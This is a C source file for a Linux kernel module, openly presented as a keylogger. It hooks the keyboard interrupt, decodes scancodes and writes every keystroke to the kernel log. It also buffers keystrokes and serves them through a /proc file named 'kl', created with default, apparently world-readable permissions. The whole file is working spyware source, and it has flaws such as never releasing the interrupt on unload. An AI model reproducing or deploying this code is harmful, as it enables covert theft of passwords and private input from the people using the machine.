#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <asm/io.h>

#include "keylogger.h"

#define PROC_FILE_NAME "kl"
#define BUFFER_SIZE 1024

static char kl_buffer[BUFFER_SIZE];
static int kl_buffer_offset = 0;
static struct file_operations proc_fops;

/*
 This function services keyboard interrupts.
*/

static void reset_buffer(void)
{
	kl_buffer_offset = 0;
	memset(kl_buffer, 0, BUFFER_SIZE);
}

static irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	static unsigned char scancode;
	int reslt;
	char c;
	scancode = inb (0x60);

	// handle the scancode
	reslt = handle_scancode(scancode, &c);
	if(reslt == NEW_CHAR) {
		printk("%c", c);
		if(kl_buffer_offset >= BUFFER_SIZE) {
			reset_buffer();
		}

		kl_buffer[kl_buffer_offset++] = c;
	}

	return (irq_handler_t) IRQ_HANDLED;
}

static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) {
	int read_size;
	if(count > BUFFER_SIZE) {
		read_size = BUFFER_SIZE;
	} else {
		read_size = count;
	}

	copy_to_user(buf, kl_buffer, read_size);
	reset_buffer();
	return read_size;
}

/*
 Initialize the module - register the IRQ handler
*/
static int __init init_keylogger(void)
{
	int result;
	proc_fops.read = read_simple;
	/*
 	 Request IRQ 1, the keyboard IRQ, to go to our irq_handler SA_SHIRQ means we're willing to have othe handlers on this IRQ. SA_INTERRUPT can be used to make the handler into a fast interrupt.
	*/
	result = request_irq (KBD_INT, (irq_handler_t) irq_handler, IRQF_SHARED, "test_keyboard_irq_handler", (void *)(irq_handler));
	if(!result) {
		proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
	}
	return result;
}

static void __exit exit_keylogger(void)
{
	remove_proc_entry(PROC_FILE_NAME, NULL);
}

module_init(init_keylogger);
module_exit(exit_keylogger);
MODULE_LICENSE ("GPL");
